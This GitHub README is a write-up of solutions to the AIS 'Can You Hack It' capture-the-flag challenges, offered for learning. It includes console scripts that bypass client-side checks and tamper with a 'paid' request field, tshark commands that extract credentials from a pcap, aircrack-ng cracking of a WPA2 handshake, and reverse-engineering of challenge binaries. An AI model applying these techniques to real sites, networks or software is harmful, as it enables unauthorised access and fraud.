# AIS-Can-You-Hack-It-Solutions
Solutions to the AIS Can You Hack It challenges.

Link here: <https://hack.ainfosec.com/>

The page says "Score a total of 700 points to unlock the ability to submit your score. Your score submission and email will be sent directly to AIS and someone will be in touch."
I completed every challenge for a total of 2685 points and submitted my score, and over a month later was never reached out to. I think we can safely assume the challenges are no longer being used as a recruitment tool and are now just for fun: therefore I think it is ethical to share my solutions for learning purposes. If this is not correct, simply reach out and I'll make the repo private once more.


## Table of Contents

- [Client-side Protections](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#client-side-protections) (100 points total)
    - [Disabled](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#disabled-10-points) (10 points)
    - [Button Clicker](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#button-clicker-15-points) (15 points)
    - [Weird Input](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#weird-input-25-points) (25 points)
    - [Paid Content](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#paid-content-50-points) (50 points)
- [Programming](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#programming) (490 points total)
    - [Birthday](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#birthday-15-points) (15 points)
    - [Secure OTP](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#secure-otp-75-points) (75 points)
    - [Code Breaker](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#code-breaker-150-points) (150 points)
    - [Tiles](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#tiles-250-points) (250 points)
- [Networking](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#networking) (45 points total)
    - [HTTP Basic](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#http-basic-15-points) (15 points)
    - [WPA2 Deauth](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#wpa2-deauth-30-points) (30 points)
- [Reverse Engineering](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#reverse-engineering) (925 points total)
    - [Baby's First RE](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#babys-first-re-25-points) (25 points)
    - [Defeating Dr. D. Bugg](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#defeating-dr-d-bugg-50-points) (50 points)
    - [Sentence Bot](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#sentence-bot-100-points) (100 points)
    - [Defuse](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#defuse-250-points) (250 points)
    - [Debug Me](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#debug-me-500-points) (500 points)
- [Steganography](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#steganography) (100 points total)
    - [Frequency Analysis](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#frequency-analysis-25-points) (25 points)
    - [Hidden Pictures](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#hidden-pictures-75-points) (75 points)
- [Crypto](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#crypto) (600 points total)
    - [Skip Cipher](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#skip-cipher-25-points) (25 points)
    - [Encoded](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#encoded-75-points) (75 points)
    - [XOR](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#xor-100-points) (100 points)
    - [ENGIMA](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#enigma-150-points) (150 points)
    - [Ransom](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#ransom-250-points) (250 points)
- [Exploitation](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#exploitation) (200 points total)
    - [Stack Overflow](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#stack-overflow-25-points) (25 points)
    - [Lonely Bot](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#lonely-bot-175-points) (175 points)
- [Input Validation](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#input-validation) (225 points total)
    - [SQL Login](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#sql-login-50-points) (50 points)
    - [Cross Site Scripting](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#cross-site-scripting-75-points) (75 points)
    - [SQL Credit Cards](https://github.com/jlcarr/AIS-Can-You-Hack-It-Solutions#sql-credit-cards-100-points) (100 points)



## Solutions
### Client-side Protections
#### Disabled (10 points)
The submit button is disabled.
You can either inspect it in the browser and remove the `disabled` property, or run the following command in the console:

```JavaScript
document.querySelector("button[disabled][ref='submitButton']").disabled = false;
```

After the button is enabled, just click it.


#### Button Clicker (15 points)
The "Click me a lot" button needs to be clicked 1000000 times before the Submit button will be accepted.
However looking at the Network tab in the developer tools we can see the source code for `button_clicker.js`, which shows us the number of clicks is tracked with the variable `ButtonClicker_num_clicks`.
There's also an extra security check if we simply set the value to greater than 1000000 without clicking the button: a local storage boolean `"ButtonClicker_hacking_detected"` which is set to `true` every 100ms with a timer `ButtonClicker_timerId`.

We can bypass both with the following command in the console:

```JavaScript
ButtonClicker_num_clicks = 1000000;
clearInterval(ButtonClicker_timerId);
localStorage.setItem("ButtonClicker_hacking_detected", false);
```

Then just click submit.


#### Weird Input (25 points)
Every time we try to enter the requested string, the input values get changed to all `'a'`s.
We can look at the Network tab in the developer tools and see the source code for `weird_input.js`, which shows us the function `WeirdInput_handle_input` is changing the values.
We could override this function, or more easily override the submit function with the following command in the console:


```JavaScript
function WeirdInput_submit(tag) {
    let input = $(tag.refs.answer);
    input.val(document.querySelector("code").textContent);
    let promise = $.Deferred();
    return promise.resolve();
}
```

After which we can just click submit.


#### Paid Content (50 points)
Clearly we need to flip come variable to say we are a paid user. But where? Looking for a source js file for this challenge turns out it's quite well obfuscated.
However, if we click the submit button we see a POST request is sent, and we can inspect the payload in the Network tab.
We see it contains an `"answer"` key, which contains a string of a JSON. Amongst the keys of this JSON is `"paid"` which is a boolean set to `false`.
So to hack this challenge we can copy the same request, but change the `"paid"` value to `true`.
We can do this by just right-clicking the request in the Network tab and choosing Copy > Copy as fetch.
The `"answer"` field is in the request `"body"` and is url encoded. So look for the subsgtring `"%22paid%22%3Afalse"`, which decodes to `"paid":false` and replace it with `"%22paid%22%3Atrue"`"
Execute the fetch command in the Console tab, then refresh the page to complete the challenge.


### Programming
#### Birthday (15 points)
Clicking the "Submit" button doesn't work, and looking at birthday.js we see there is a `Birthday_submit` function which first checks the `sha256` hashof the current date to the birthday's hash before submitting it. Overriding this to force a submit doesn't work.
But this means we have a `sha256` hash value that will match the birthday string. With 365 possible birthdays per year, this means there are less than 36500 in the last hundred years, so we cna easily brute force a solutions.
We can do this by running the following command in the console:

```JavaScript
for(var idd=0; idd<31; idd++){
    for(var imm=0;imm<=12;imm++){
        for(var iyyyy=2024;iyyyy>=1900;iyyyy--){
            var dd = String(idd).padStart(2, '0');
            var mm = String(imm).padStart(2, '0'); //January is 0!
            var yyyy = iyyyy;
            today = `${mm}/${dd}/${yyyy}`;
            
            var result = sha256(today.toString());
        
            if (result === Birthday_date_hash){
                console.log(today);
                birthday = today;
            }
        }
    }
}
```

And we can finish up by overriding the `Birthday_get_today` function to return the value we found:

```JavaScript
function Birthday_get_today() {
    return today;
}
```

After which we can just click submit.


#### Secure OTP (75 points)
It seems a new random 6-digit OTP is generated every minute, and we don't have access to the phone receiving the OTP. When we try brute-forcing we're blocked, so it seems an impossible task.
However, if we click the "Submit" button, sending a bad submit, we'll get the following hints:
- In the console log we get the following message: `[MySecureOTP][DEBUG]: TODO REMOVE THIS: Seed is: 1705355344`, so we have the seed value for the random number generator, so if we can figure out which random number generator is being used, and how it's used to construct the OTP, then we could solve the puzzle.
- If we send if a few bad submits we get an error message in the GUI saying `"Hint: Each digit of the OTP is chosen randomly with randint(0, 9) from left to right."`, since `randint` is a Python function we should try that.

Looking through the source on `secure_otp.js` we can figure out another quick way to get the seed, with the following command in the console:

```JavaScript
console.log($("#" + SecureOTP_oid)[0]._tag.challenge.seed);
```

Now using a Python shell we can run the following command to implement the hints we received:

```Python
seed = 1705355344 # change this to whatever seed value you have
import random
random.seed(seed)
print(''.join(map(str,[random.randint(0, 9) for i in range(6)])))
```

Pasting the result into the OTP box and pressing the "Submit" button completes the challenge.
Make sure to not let the time run out between getting the `seed` value and submitting the answer.


#### Code Breaker (150 points)
The instructions are pretty straightforeward. After opening the problem the Console also has a messaging telling us to use `CodeBreaker_submit(code)` to submit programmatically.
The following command will crack the code:

```JavaScript
async function break_code(){
    var res = "0000000";
    var score = await CodeBreaker_submit(res);
    for(var i = 0; i < 7; i++){
        for (var d = 0; d < 10 + 26*2; d++){
            var v = String(d);
            if (d >= 10) v = String.fromCharCode(d-10+'a'.charCodeAt(0));
            if (d >= 10+26) v = String.fromCharCode(d-10-26+'A'.charCodeAt(0));
            res = res.substring(0, i) + v + res.substring(i+1);
            var val = await CodeBreaker_submit(res);
            console.log(res);
            console.log(val);
            if (val > score){
                score = val;
                break;
            }
        }
    }
    console.log("Complete. Code is:");
    console.log(res);
    return res;
}
```

The code will also submit, so there's nothing else to do!


#### Tiles (250 points)
Here we have a 5x5 sliding tile puzzle which needs to be solved in under 2 minutes, and with less than 350 moves. Very difficult for a human to achieve.
As it turns out, the search space size (`(5*5)!`) makes it difficult for most search algorithms we throw at it.
However I found using some human-style analysis to get the puzzle close to a finished state, then throwing A-star search at it works pretty well.

Start off by grabbing the board state in a list-of-lists format. We can do this with the following snippet of JavaScript in the console:

```JavaScript
console.log(JSON.stringify(Tiles_getGameBoard()));
```

Then use the SlidingTileSolver.ipynb Jupyter Notebook to run the algorithms for solving the problem. A description of how the algorithms work is inside the notebook.

The result will be a comma-separated string of moves, with can be pasted into the input box and clicking the Submit button completes it.


### Networking
#### HTTP Basic (15 points)
The standard tools for analyzing pcaps is Wireshark. We can use the commandline tool `tshark`.
Documentation is [here](https://www.wireshark.org/docs/man-pages/tshark.html).

In particular we'll want to find all HTTP requests with a body, i.e. POST requests, and extract the body and look for the username and password.


```Bash
tshark -r http-auth.cap -Y "http.request.method == POST" -T fields -e text
```

- `-r` is to read the .cap file.
- `-Y` is the filter the packets, in this case to POST requests.
- `-T` is specify the output format, in this case the fields
	- `-e` is to specificly out them as plain text.

Or for a more legible output:

```Bash
tshark -r http-auth.cap -Y "http.request.method == POST" -T fields -e urlencoded-form.key -e urlencoded-form.value | python3.11 -c "import sys;[print('\n'.join(map(': '.join,zip(*[col.split(',') for col in line.split('\t')])))) for line in sys.stdin.read().splitlines()]"
```

From this output we can get the form values, and see the fields `"name"` and `"pass"`, from which we get out answer.
Just past them in and click Submit.


#### WPA2 Deauth (30 points)
This time we are asked to crack a WPA2 handshake from the wifi using the pcap.
The main tool used to do this is `aircrack-ng`, though it requires a wordlist for its cracking.
A popular choice is the RockYou password list, which can be downloaded [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
Afterwards just run the command:


```Bash
aircrack-ng -w rockyou.txt de-auth.cap 
```

It should first present the MAC address (BSSID) and the SID (ESSID), before starting the crack, which should take a few minutes before presenting the password.


### Reverse Engineering
#### Baby's First RE (25 points)
The standard tool for analyzing binaries is Ghidra.
Documentation is [here](https://ghidra-sre.org/).

Decompiling the `babysfirst` binary with Ghidra shows the `main` contains this code:

```C
  iVar1 = strncmp("bin-continu",(char *)&local_1c,0xb);
  if (iVar1 == 0) {
    puts("You did it!");
  }
  else {
    puts("Nope :(");
  }
```

So the user input is compared to the string `"bin-continu"`, which is the password.


#### Defeating Dr. D. Bugg (50 points)
This time we need to figure out which capitalization of the password command "quietrobotplease" will turn out completely lower case after going through the scrambling program.

If we look at the strings we will see under `DOCTOR_DASTARDLY_BUGGS_JOURNAL`

```
AAAAAAAAH
AAAAAAAAH
My evil plan is finally complete! My robot will destroy everything! I gave out the command for deactivation, as well as the command transmitter, but the transmitter will change any commands to be shouted at the robot! And the robot ignores any commands that are shouted at it, because it only accepts commands from polite people! I left in 2 working command capitalization combinations so that I may deactivate the robot at some point, but nobody will ever figure either of them out! Mwahahahahaha!
Note to self (the handsome Dr. Dastardly): remember not to compile the command transmitter in debug mode when you give it away, or else your variable names will be on full display! And fix that bad habit of using strings as documentation!
D Bugg Documentation: The scrambling is based on the formula: (n*13+7)mod16=result. The numbers 13 and 7 are crucial, so make sure nobody finds them out!
D Bugg Documentation: Do not let users try to trick the system! Away with all wrong-length commands!
D Bugg Documentation: This pays attention to both the value of a character and its capitalization. Twice the influences means twice the confusion! Very secure!
```

If we open the program up in Ghidra and do a little work on the main function `command_transmitter` we get the following decompile:

```C
char* command_transmitter(char *param_1)
{
  bool isupper;
  char newchar;
  char c;
  char* __dest;
  size_t length;
  int curr_index;
  int influence_index;
  int next_index;
  
  __dest = (char*)malloc(16);
  length = strlen(param_1);
  if (length == 16) {
    strcpy(__dest,param_1);
    curr_index = 0;
    influence_index = 7;
    next_index = curr_index;
    while (curr_index = next_index, influence_index != 0) {
      influence_index = get_influence_index(curr_index);
      c = param_1[influence_index];
      isupper = char_is_uppercase(c);
      if (isupper) {
        newchar = switch_char_case(__dest[curr_index]);
        __dest[curr_index] = newchar;
      }
      isupper = char_is_even(c);
      next_index = influence_index;
      if (isupper) {
        c = switch_char_case(__dest[curr_index]);
        __dest[curr_index] = c;
      }
    }
  }
  else {
    __dest = fill_string_with_A(__dest);
  }
  return __dest;
}
```

From here we can work things out with the circular chain of dependencies, however, at `2**16 == 65536` possible capitalizations, we can actually brute force this easily.

```C
int main()
{
  char* target = "quietrobotplease";
  char sol[16+1];
  for (int i = 0; i < (1<<16); i++)
  {
    strcpy(sol, target);
    for (int j = 0; j < 16; j++)
      if((1<<j) & i)
        sol[j] = switch_char_case(sol[j]);
    char* scrambled = command_transmitter(sol);
    if (!strcmp(scrambled, target))
      printf("%d: %s -> %.16s\n", i, sol, scrambled);
  }

  return 0;
}
```

The code is all together with the other required decompiled functions in `command-transmitter.c`
Which gives the following 2 solutions:

```
3270: qUIetrOBotPLease -> quietrobotplease
62265: QuiETRobOTplEASE -> quietrobotplease
```


#### Sentence Bot (100 points)
This problem can be solved quite directly ignoring most of the program's intended function.

Opening the binary in Ghidra we can see the `main` function handles some commandline args before going into the `generateSentence` function, which seems to generate random sentences by picking random strings from its list of `ARTICLES` then `NOUNS` then `VERBS` before comparing to the string `"the flag is"` before going into the function `getFlag`.
If the random string fails to match `"the flag is"` then it will instead use a random word from `PREPOSITIONS` then `PROPER_NOUN`.

```C
char * getFlag(undefined8 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
              undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  int isequal;
  char *mac;
  char *result;
  size_t length;
  
  mac = (char *)getMac(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  if (mac == (char *)L'\0') {
    result = (char *)0;
  }
  else {
    isequal = strcmp(mac,"de:ad:be:ef:fa:ce");
    if ((isequal == 0) && (user_seed != 0)) {
      puts("You win!");
    }
    printf("Mac Address: %s\n",mac);
    length = strlen(mac);
    result = xorencrypt(FLAG,17,mac,(int)length);
    free(mac);
  }
  return result;
}
```

The `getFlag` function seems to check the actual machine's MAC address with `getMac` and if it's equal to `"de:ad:be:ef:fa:ce"`, will tell you `"You win!"` before returning MAC address encrypted with the function `xorencrypt` with data located at the global `FLAG` which is then returned to complete the sentence `"the flag is"`.

So we don't need to worry about the business of seeding the random number generator, all we need is to xor the data in `FLAG` with `"de:ad:be:ef:fa:ce"`, which are both length 17.
We can actually use Ghidra's Python scripting to do this for us:

```Python
FLAG_addr = currentProgram.getSymbolTable().getGlobalSymbols('FLAG')[0].getAddress()
FLAG_data = getDataAt(FLAG_addr).getBytes()
print(''.join(chr(i^ord(c)) for i,c in zip(FLAG_data,"de:ad:be:ef:fa:ce")))
```

Which gives us the password.


#### Defuse (250 points)
Opening up the binary in Ghidra we see in the `main` function that it is split up into 4 phases, and similarly our input on the site has 4 fields.

**Phase 1** is in `phase_unlock` function which we can see in the decompiled code contains a user input and a string comparison:

```C
strcmp_result = strcmp(user_input,"Linus-Torva1");
```

So the first password is just the plain string `"Linus-Torva1"`.

**Phase 2** is in the `phase_disarm` which we can see takes user input, and also checks for a `cntrl_z` to be executed by the user to stop the timer. We can ignore this for our solving. The user input is then checked in `check_disarm`.

```C
bool check_disarm(char *param_1)

{
  bool result;
  uint i;
  int matches;
  int unscrambled_wires [7];
  int input_wires [7];
  int k;
  int j;
  
  i = 0;
  do {
    *(undefined4 *)((int)input_wires + i) = 0;
    i = i + 4;
  } while (i < 28);
  i = 0;
  do {
    *(undefined4 *)((int)unscrambled_wires + i) = 0;
    i = i + 4;
  } while (i < 28);
  matches = __isoc99_sscanf(param_1,"%d %d %d %d %d %d %d",input_wires);
  if (matches == 7) {
    for (j = 0; j < 7; j = j + 1) {
      if ((6 < input_wires[j]) || (input_wires[j] < 0)) {
        return false;
      }
      unscrambled_wires[j] = *(int *)(wire_cut_sequence + input_wires[j] * 4);
    }
    for (k = 0; k < 6; k = k + 1) {
      if (unscrambled_wires[k + 1] < unscrambled_wires[k]) {
        return false;
      }
    }
    result = true;
  }
  else {
    result = false;
  }
  return result;
}
```

We can see from the decompiled code that 7 `int`s from the user input are read into `input_wires`, the must be between 0 and 6 inclusive, and are used to index into `wire_cut_sequence` and finally we check the unscrambled order is not decreasing. I don't see why from the code we couldn't just put the same number, but the site doesn't accept it as an answer. 
So what is the order? In Ghidra we can double click on the global data label `wire_cut_sequence` and read the contents easily enough, but we can also use Python scripting in Ghidra to do it for us:

```Python
import struct
wire_cut_sequence_addr = currentProgram.getSymbolTable().getGlobalSymbols('wire_cut_sequence')[0].getAddress()
wire_cut_sequence_data = getDataAt(wire_cut_sequence_addr).getBytes()
wire_cut_sequence_values = struct.unpack("<iiiiiii", wire_cut_sequence_data)
sorted_wire_cut_sequence = sorted(enumerate(wire_cut_sequence_values), key=lambda wire:wire[1])
wire_cut_sequence = [wire[0] for wire in sorted_wire_cut_sequence]
print(' '.join(map(str,wire_cut_sequence)))
```

Which gives us the answer for phase 2.

**Phase 3** is in `phase_reverse`, which again takes user input.

```C
void phase_reverse(void)

{
  int input3;
  int input2;
  int input1;
  int sum;
  int matches;
  
  read_input();
  input3 = 0;
  matches = __isoc99_sscanf(user_input,"%d %d %d",&input1,&input2,&input3);
  if (matches != 3) {
    puts("NOT ENOUGH NUMBERS!");
    explode();
  }
  if (((input1 < 0) || (input2 < 0)) || (input3 < 0)) {
    puts("NEGATIVE!");
    explode();
  }
  sum = input3 + input1 + input2;
  if (sum != -1) {
    puts("NOT NEGATIVE ENOUGH!");
    explode();
  }
  return;
}
```

The program takes 3 `int`s as input, none of them can be negative, however they must sum to -1. How can this be? With integer overflow! Checking the type by hovering over the `int`s we can see they are `signed int`s of lenth 4, meaning they are signed 32 bit `int`s.

-1 as a signed 32 bit `int` is all `1`s in binary: i.e. `-1 == 0b11111111 11111111 11111111 11111111 == 0xffffffff`.

So an easy way to do this is to use our first 2 number to put the 1 in the leading bit, then the third to fill the rest as the largest positive number.

- `0b01000000 00000000 00000000 00000000 == 0x40000000 == 1073741824`
- `0b01000000 00000000 00000000 00000000 == 0x40000000 == 1073741824`
- `0b01111111 11111111 11111111 11111111 == 0x7FFFFFFF == 2147483647`

We can check out answer in Python with Numpy fairly easily:

```Python
import numpy as np
np.int32(1073741824) +np.int32(1073741824) + np.int32(2147483647)
```

Which indeed overflows to -1.

**Phase 4** is in `phase_disposal` which requires us to do some buffer overflow.

```C
void phase_disposal(void)

{
  int scheck;
  char uinput [8];
  int i;
  
  uinput[7] = '\0';
  uinput[6] = '\0';
  uinput[0] = '\0';
  uinput[1] = '\0';
  uinput[2] = '\0';
  uinput[3] = '\0';
  uinput[4] = '\0';
  uinput[5] = '\0';
LAB_0804a080:
  while( true ) {
    if (4 < attempts) {
      explode();
      return;
    }
    attempts = attempts + 1;
    if (2 < attempts) {
      puts("You\'re getting low on attempts. Bomb disposal robot will play you a relaxing song");
      for (i = 0; i < 10; i = i + 1) {
        printf("BING!\a ");
        fflush((FILE *)stdout);
        usleep(100000);
      }
      puts("You are now relaxed.\n");
    }
    printf("\n\tAttempt: %d/%d\n",attempts,4);
    printf("\tCheck light: %d\n",(int)uinput[6]);
    printf("\tDisposal Mode: %d\n\n",(int)uinput[7]);
    printf("$ ");
    gets(uinput);
    if ((uinput[6] == 'E') && (scheck = strncmp(uinput,"le$s-d",6), scheck == 0)) break;
    puts("disposal robot malfunction");
  }
  if (uinput[7] == 'G') {
    return;
  }
  if (uinput[7] < 'H') {
    if (uinput[7] == 'F') {
      puts("Robot F mode. Beep boop what\'s this do?");
      goto LAB_0804a080;
    }
    if ('F' < uinput[7]) goto LAB_0804a07b;
    if (uinput[7] == 0) {
      puts("Disposal mode not changed!");
      goto LAB_0804a080;
    }
    if (uinput[7] == 'D') {
      puts("Robot D mode. Boop beep. The 10th Fibonacci number is 55.");
      goto LAB_0804a080;
    }
  }
LAB_0804a07b:
  explode();
  goto LAB_0804a080;
}
```

The decompilation can be a little tricky because some `char`s of the user input are also cast to `int`s for the `printf`s. However noticing there is only one `gets`, which is unsafe, to get the userinput we can be sure that treating the buffer as `char[8]` makes everything as clean as possible.
So what should the user input be? Well the first thing we see is `strncmp(uinput,"le$s-d",6)` so the first 6 characters must be `"le$s-d"`, but also we have the comparison `uinput[6] == 'E'`. Finally we see later on to exit the function we require the condition `uinput[7] == 'G'`.
All together this makes `"le$s-dEG"` which is the final password.


#### Debug Me (500 points)
This challenge was far harder than any of the previous reverse engineering challenges, or any of the other challenges in general (except perhaps "Hidden Pictures").

Before starting anything, I'm just going to say I couldn't solve it with static analysis alone: if someone has solved it with static analysis I'd love to learn how you did it. So to run it, as is best practice, you'll need a VM. We can find out the specs we need by running the file command:

```bash
file debugme
```

Which tells us we need an x86-64 Linux machine. Now we can start.

Opening up the `debugme` binary in Ghidra the decompilation is far from clean. We see things like `CONCAT71`, `UNRECOVERED_JUMPTABLE`, few functions and few strings. This is pretty hard to interpret.
However amongst the defined strings we see `"$Info: This file is packed with the     executable packer http://   .sf.net $"` and `"$Id:     3.96 Copyright (C) 1996-2020 the     Team. All Rights Reserved. $"`. What's especially interesting is this string seems censored. If we Google either of them we quickly find these are messages from the tool UPX, which is an executable packer, and often used for code obfuscation. The tool is open source, and can also be used to unpack executables, so let's do that, using the same version: 3.96.

- <https://upx.github.io/>
- <https://github.com/upx/upx/releases/tag/v3.96>

```bash
wget https://github.com/upx/upx/releases/download/v3.96/upx-3.96-amd64_linux.tar.xz
tar -xf upx-3.96-amd64_linux.tar.xz
mv upx-3.96-amd64_linux/upx .
./upx -d debugme -o debugme_unpacked
```

However this gives an error message: `upx: debugme: NotPackedException: not packed by UPX`. But how can this be? Surely it is packed with UPX if it has the string in it saying it is? But notice the string has been tampered with: the name UPX was removed after all! Perhaps more tampering has been done to make the the UPX unpacker fail? Clearly we wouldn't have tampering that would break the executable itself, so perhaps we can recover it?

Thankfully Nozomi Networks has a free and open source tool for repairing tampered UPX files.

- <https://www.nozominetworks.com/blog/automatic-restoration-of-corrupted-upx-packed-samples>
- <https://github.com/NozomiNetworks/upx-recovery-tool>

```bash
git clone https://github.com/NozomiNetworks/upx-recovery-tool.git
cd upx-recovery-tool
sudo apt-get install libmagic1
python3 -m pip install -r requirements.txt
python3 upxrecovertool.py -i ../debugme -o ../debugme_repaired
cd ..
```

Now we should be able to unpack it:

```bash
./upx -d debugme_repaired -o debugme_unpacked
```

Success! But don't celebrate too quickly: opening the unpacked binary in Ghidra we see inside the `entry` function we only see `FUN_004ad590`, and checking it gives us a decompile fail message: `Low-level Error: Overlapping input varnodes`. Clearly we're just getting started.

So how do we proceed? Well, if we look in the strings, we'll see there's a lot more contents. If we actually run the binary we'll see a few, which we can find in Ghidra:

- `0x0055c008`: `"I'm thinking of a number between 1 and 300000."`
- `0x0055c038`: `"Guess it and I'll give up my secrets."`
- `0x0055c060`: `"I don't think you understand how numbers work..."`
- `0x0055c0f8`: `"Nope! Next time, try concentrating harder."`

Looking at their references in Ghidra, we can see each is referenced once in the function `FUN_00404080`, where they are always used as inputs to the function `FUN_004d3720`. So `FUN_00404080` appears to be our main function, and `FUN_004d3720` appears to be some sort of `print` function.

I have tried a variety of techniques for automating the function identification. Because the executable is statically compiled, it includes all its library functions' code, and hence why it's over a megabyte despite how little it actually does. Looking at the strings we can see evidence of the standard C library there. I have tried Ghidra's built-in Function ID functionality, using additional .fidb files from this [repo](https://github.com/threatrack/ghidra-fidb-repo) (see also [this](https://blog.threatrack.de/2019/09/20/ghidra-fid-generator/), and [this](https://www.youtube.com/watch?v=P8Ul2K7pEfU&list=PLXqdTlog3E_8Ucym6klVOY9RmjdIy3cbm&index=12)). I have tried FLIRT signatures using the Python script implementation from this [repo](https://github.com/NWMonster/ApplySig) and .sig files from this [repo](https://github.com/push0ebp/sig-database). However the functions calls our main `FUN_00404080` remain unidentified. So instead we can guess based on the signatures and inputs/outputs, as well as attach the debugger to help check the inputs and outputs: here's my mapping:

- `FUN_00404080` -> `RE_main`: Because this is where the main logic is happening.
- `FUN_004d3720` -> `RE_puts`: Because it takes in strings it writes to stdout, but no string size, or stream file handle. (documentation [here](https://man7.org/linux/man-pages/man3/puts.3.html))
- `FUN_004d2a30` -> `RE_fgets`: Because the user input read happens right after the prompt write before any other logic, the signature matches and there is the check for returning NULL on error. (documentation [here](https://man7.org/linux/man-pages/man3/fgets.3.html))
   - We can also double check in the GDB debugger by placing a breakpoint after the read and checking the contents matches your input:
   1. `gdb ./debugme_unpacked` open the executable in GDB
   2. `(gdb) b *0x0040419e` Set the breakpoint after the call so we can check the result.
   3. `(gdb) r` run the executable with the debugger.
   4. Give input when prompted as normal with debugme.
   5. Breakpoint will be hit.
   6. `(gdb) printf "%s", $rax` This will print the result as a string. You should see your input.
- `FUN_004ccb80` -> `RE_strtoul`: Besides making sense to extract the value after reading the string, the second input being the NULL pointer is standard, and we see base 10 as the final input, and the returned value is then used for checks corresponding to the 1-3000000 given bounds. (documentation [here](https://man7.org/linux/man-pages/man3/strtoul.3.html))
   - Again we can also double check in GDB:
   1. `gdb ./debugme_unpacked`
   2. `(gdb) b *0x004041b6` Set the breakpoint after the call so we can check the result.
   3. `(gdb) r` run the executable with the debugger.
   4. Give input when prompted as normal with debugme.
   5. Breakpoint will be hit.
   6. `(gdb) p $rax` This will print the result register. You should see your input.
- `FUNC004d5ce0` -> `RE_fputc`: We shall see later that this makes sense. (documentation [here](https://man7.org/linux/man-pages/man3/puts.3.html))


```C
undefined8 RE_main(void)

{
  char *input_ptr;
  ulong input_value;
  char c_enc;
  long in_FS_OFFSET;
  char input_str [40];
  long local_30;
  long counter;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  do {
    counter = FUN_004c54b0();
  } while (counter != 8);
  do {
    counter = FUN_004c54b0();
  } while (counter != 8);
  RE_puts("I\'m thinking of a number between 1 and 3000000.");
  RE_puts("Guess it and I\'ll give up my secrets.");
  input_ptr = RE_fgets(input_str,32,(FILE *)PTR_DAT_005bbc18);
  if (input_ptr == (char *)0x0) {
    FUN_004c5320(0);
  }
  else {
    input_value = RE_strtoul(input_str,(char **)0x0,10);
    if (2999999 < input_value - 1) {
      RE_puts("I don\'t think you understand how numbers work...");
      goto LAB_00404231;
    }
    if ((_DAT_005bd368 ^ 3000001) == input_value) {
      c_enc = 'S';
      counter = 0;
      do {
        c_enc = c_enc ^ (&DAT_0055c098)[counter];
        RE_fputc(c_enc,(FILE *)PTR_DAT_005bbc10);
        c_enc = (&DAT_0055c0c9)[counter];
        counter = counter + 1;
      } while (c_enc != '\0');
      RE_fputc('\n',(FILE *)PTR_DAT_005bbc10);
      goto LAB_00404231;
    }
  }
  RE_puts("Nope! Next time, try concentrating harder.");
LAB_00404231:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  FUN_0051dea0();
}
```

So it seems our `input_value` is compared against the expression `(_DAT_005bd368 ^ 3000001)`, so this should be the number we need to guess. However, if we attach the debugger, and check the compared values, which happens at instruction `0x004041ca`, we see the value it's being compared to is often a garbage far outside the 1-3000000 range. If this test fails, we get the `"Nope!"` message, so we can use the debugger to ensure we pass the test:

1. `gdb ./debugme_unpacked`
2. `(gdb) b *0x004041ca` Set the breakpoint at the test.
3. `(gdb) r` Run the executable.
4. Enter any input when prompted.
5. The breakpoint will then be hit.
6. `(gdb) x/i $pc` Print the current instruction to verify it's the comparison.
7. `(gdb) p $rax` Print your input.
8. `(gdb) p (unsigned long)$rbp` Print the value your input is being compared to.
9. `(gdb) set $rax=$rbp` Set your input value to the value it's being compared to.
10. `(gdb) cont` Continue the execution.
11. We get the following output: `No fair! I refuse to help out a cheater.`

Now this is interesting. Not only was our attempt at fudging the results detected, but if we search for the `"No fair!"` string, it doesn't appear in the binary: it must be encrypted or obfuscated. We see a loop after the check in which values taken from `DAT_0055c098` and `DAT_0055c0c9` are XORed together: could these be the string? Looking in the listing, they're in the .data section, with high entropy, but also seem to have some ASCII values sprinkled in, also they're adjacent. Seems likely. We can check easily in Ghidra using Python scripting:

```Python
addr1, addr2 = (0x55c098, 0x0055c0c9-1)
print(''.join(chr(getByte(toAddr(addr1+i)) ^ getByte(toAddr(addr2+i))) for i in range(addr2-addr1)))
```

Sure enough we get the decrypted string, terminated by null bytes. But where do we go from here? Well, since this data was XOR encrypted, perhaps there is other hidden data, maybe the flag? We can easily check all pairs start strings, and search efficiently for english words. This exploration was fruitful, and I've shown more in detail in the DebugMeSolver.ipynb Jupyter Notebook. Here are the resultant strings:

